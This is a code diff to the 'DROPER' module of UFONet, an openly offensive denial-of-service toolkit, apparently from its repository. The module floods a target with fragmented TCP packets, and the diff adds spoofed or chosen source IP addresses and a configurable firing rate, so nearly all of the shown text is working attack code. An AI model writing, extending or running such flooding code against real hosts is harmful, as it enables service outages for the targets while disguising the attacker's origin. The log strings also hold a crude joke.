@@ -10,6 +10,7 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
+from core.mods.mod_config import DROPER_SPEED
 try:
     from urlparse import urlparse
 except:
@@ -29,7 +30,7 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def droperize(ip, sport, rounds):
+def droperize(ip, sport, rounds, source_ip = None):
     n=0
     try:
         for x in range (0,int(rounds)):
@@ -42,6 +43,12 @@ def droperize(ip, sport, rounds):
             except:
                 print("[Error] [AI] [DROPER] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                 break
+            if source_ip is None:
+                print("[Info] [DROPER] Using random source IP")
+                IP_p.src = randIP()
+            else:
+                print("[Info] [DROPER] Using given source IP")
+                IP_p.src = source_ip
             TCP_l = TCP()
             TCP_l.sport = s_zombie_port
             TCP_l.dport = sport
@@ -52,14 +59,14 @@ def droperize(ip, sport, rounds):
                 for f in frags:
                     send(f, verbose=0)
                 print("[Info] [AI] [DROPER] Firing 'deuterium bosons' ["+str(n)+"] -> [DROPING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/DROPER_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [DROPER] Failed to engage with 'deuterium bosons' ["+str(n)+"]")
     except:
         print("[Error] [AI] [DROPER] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class DROPER(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source = None):
         print("[Info] [AI] 'IP FRAGMENTATION' (DROPER) is ready to fire: [" , rounds, "deuterium bosons ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -83,4 +90,4 @@ class DROPER(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [DROPER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        droperize(ip, sport, rounds) # attack with DROPER using threading
+        droperize(ip, sport, rounds, source) # attack with DROPER using threading
